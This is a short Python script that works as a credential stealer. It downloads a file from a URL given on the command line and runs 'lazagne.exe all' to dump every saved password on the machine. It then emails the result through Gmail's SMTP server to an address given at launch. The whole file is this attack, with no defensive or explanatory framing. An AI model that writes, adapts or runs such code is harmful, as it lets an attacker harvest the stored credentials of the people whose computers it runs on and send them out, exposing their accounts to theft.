import subprocess
import smtplib
import os
import optparse
from optparse import OptionParser
import requests

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")
    with open(file_name[-1], "wb") as outfile:
        outfile.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email, email, message)
    server.quit()

def main():
    parser = OptionParser()
    parser.add_option("-m", "--mail", dest="email", help="Your email")
    parser.add_option("-p", "--pass", dest="password", help="Your pass")
    parser.add_option("-u", "--url", dest="url", help="File to download")
    (option, args) = parser.parse_args()
    email = option.email
    password = option.password
    url = option.url
    download(url)
    try:
    	command = "lazagne.exe all"
    	result = subprocess.check_output(command,shell=True)
    	send_mail(email, password, result)
    except:
	print "Unsuccessful execution."

if __name__=='__main__':
    main()
